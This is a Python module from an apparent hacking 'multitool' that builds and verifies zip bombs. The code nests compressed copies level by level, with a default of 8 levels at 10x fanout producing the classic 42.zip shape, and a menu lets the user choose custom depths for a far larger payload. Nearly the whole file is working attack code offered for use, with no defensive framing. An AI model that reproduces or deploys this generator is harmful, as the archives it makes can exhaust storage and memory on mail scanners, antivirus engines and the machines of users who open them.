# modules/zipbomb.py
# zipbomb module — Insomnia Multitool edition
# menu-native: exposes zipbomb_menu() for numeric dispatch
# algorithm: your py2 script, ported to py3, unchanged behavior

import os
import shutil
import sys
import time
import zipfile


# ----------------------------------------------------------------------------
# core (your original algorithm, py3-clean)
# ----------------------------------------------------------------------------

def get_file_size(filename):
    return os.stat(filename).st_size


def generate_dummy_file(filename, size_mb):
    chunk = b'0' * (1024 * 1024)
    with open(filename, 'wb') as dummy:
        for _ in range(size_mb):
            dummy.write(chunk)


def get_filename_without_extension(name):
    base = os.path.basename(name)
    idx = base.rfind('.')
    return base[:idx] if idx != -1 else base


def get_extension(name):
    base = os.path.basename(name)
    idx = base.rfind('.')
    return base[idx + 1:] if idx != -1 else ''


def compress_file(infile, outfile):
    with zipfile.ZipFile(outfile, mode='w', allowZip64=True) as zf:
        zf.write(infile, compress_type=zipfile.ZIP_DEFLATED)


def make_copies_and_compress(infile, outfile, n_copies):
    base = get_filename_without_extension(infile)
    ext = get_extension(infile)
    with zipfile.ZipFile(outfile, mode='w', allowZip64=True) as zf:
        for i in range(n_copies):
            f_name = (f'{base}-{i}.{ext}' if ext else f'{base}-{i}')
            shutil.copy(infile, f_name)
            zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
            os.remove(f_name)


# ----------------------------------------------------------------------------
# build + verify
# ----------------------------------------------------------------------------

def build(out_zip_file, n_levels, fanout=10, leaf_mb=1):
    if n_levels < 1:
        raise ValueError('n_levels must be >= 1')
    if fanout < 2:
        raise ValueError('fanout must be >= 2')
    if leaf_mb < 1:
        raise ValueError('leaf_mb must be >= 1')

    start = time.time()
    dummy_name = 'dummy.txt'
    level_1_zip = '1.zip'

    generate_dummy_file(dummy_name, leaf_mb)
    compress_file(dummy_name, level_1_zip)
    os.remove(dummy_name)

    decompressed_size = leaf_mb
    for i in range(1, n_levels + 1):
        make_copies_and_compress(f'{i}.zip', f'{i + 1}.zip', fanout)
        decompressed_size *= fanout
        os.remove(f'{i}.zip')

    if os.path.isfile(out_zip_file):
        os.remove(out_zip_file)
    os.rename(f'{n_levels + 1}.zip', out_zip_file)

    return {
        'path': out_zip_file,
        'disk': get_file_size(out_zip_file),
        'theoretical_gb': decompressed_size,
        'elapsed': time.time() - start,
    }


def verify(path):
    if not os.path.isfile(path):
        raise FileNotFoundError(path)
    disk = get_file_size(path)
    with zipfile.ZipFile(path, 'r') as z:
        infos = z.infolist()
        top_entries = len(infos)
        top_uncompressed = sum(i.file_size for i in infos)
    return {
        'path': path, 'disk': disk,
        'top_entries': top_entries,
        'top_uncompressed': top_uncompressed,
        'ratio': (top_uncompressed / disk) if disk else 0.0,
    }


# ----------------------------------------------------------------------------
# menu entry — matches Insomnia's numeric dispatch style
# ----------------------------------------------------------------------------

def zipbomb_menu():
    from core.display import Colorate, Theme, print_banner, get_inpt
    from core.paginated_ui import PaginatedUI

    _cl = Theme.get_colors()

    while True:
        print_banner()
        PaginatedUI.draw_card_box("ZIP BOMB BUILDER", {
            "1": "Build (default: 8 levels, 10x fanout, 1MB leaf)",
            "2": "Build (custom levels / fanout / leaf)",
            "3": "Verify existing bomb",
            "99": "Return",
        })
        _c = get_inpt("insomina@zipbomb:~#").strip().lower()

        # ---- default build ----
        if _c == "1":
            out = get_inpt("output path (42.zip):").strip() or "42.zip"
            levels_raw = get_inpt("levels (8):").strip() or "8"
            try:
                levels = int(levels_raw)
                if levels < 1 or levels > 20:
                    raise ValueError
            except ValueError:
                print(Colorate.Horizontal(_cl["num"], "  [!] levels must be 1..20"))
                input("\n  Enter...")
                continue
            try:
                print(Colorate.Horizontal(_cl["head"], f"  [*] Building {levels}-level bomb -> {out}"))
                r = build(out, levels)
                print(Colorate.Horizontal(_cl["head"], f"  [+] Done: {r['path']}"))
                print(Colorate.Horizontal(_cl["num"], f"      compressed:  {r['disk'] / 1024.0:.2f} KB"))
                print(Colorate.Horizontal(_cl["num"], f"      decompressed: {r['theoretical_gb']:,} GB"))
                print(Colorate.Horizontal(_cl["num"], f"      time:        {r['elapsed']:.2f}s"))
            except Exception as e:
                print(Colorate.Horizontal(_cl["num"], f"  [!] Build failed: {e}"))
            input("\n  Enter...")

        # ---- custom build ----
        elif _c == "2":
            out = get_inpt("output path (42.zip):").strip() or "42.zip"
            try:
                levels = int(get_inpt("levels (8):").strip() or "8")
                fanout = int(get_inpt("fanout (10):").strip() or "10")
                leaf = int(get_inpt("leaf MB (1):").strip() or "1")
            except ValueError:
                print(Colorate.Horizontal(_cl["num"], "  [!] invalid number"))
                input("\n  Enter...")
                continue
            try:
                print(Colorate.Horizontal(_cl["head"], f"  [*] Building L={levels} F={fanout} leaf={leaf}MB -> {out}"))
                r = build(out, levels, fanout, leaf)
                print(Colorate.Horizontal(_cl["head"], f"  [+] Done: {r['path']}"))
                print(Colorate.Horizontal(_cl["num"], f"      compressed:  {r['disk'] / 1024.0:.2f} KB"))
                print(Colorate.Horizontal(_cl["num"], f"      decompressed: {r['theoretical_gb']:,} GB"))
                print(Colorate.Horizontal(_cl["num"], f"      time:        {r['elapsed']:.2f}s"))
            except Exception as e:
                print(Colorate.Horizontal(_cl["num"], f"  [!] Build failed: {e}"))
            input("\n  Enter...")

        # ---- verify ----
        elif _c == "3":
            path = get_inpt("bomb path:").strip()
            try:
                r = verify(path)
                print(Colorate.Horizontal(_cl["head"], f"  [+] {r['path']}"))
                print(Colorate.Horizontal(_cl["num"], f"      disk:       {r['disk']:,} B"))
                print(Colorate.Horizontal(_cl["num"], f"      entries:    {r['top_entries']:,}"))
                print(Colorate.Horizontal(_cl["num"], f"      uncompressed: {r['top_uncompressed']:,} B"))
                print(Colorate.Horizontal(_cl["num"], f"      ratio:      {r['ratio']:,.0f}x"))
            except Exception as e:
                print(Colorate.Horizontal(_cl["num"], f"  [!] Verify failed: {e}"))
            input("\n  Enter...")

        elif _c == "99":
            break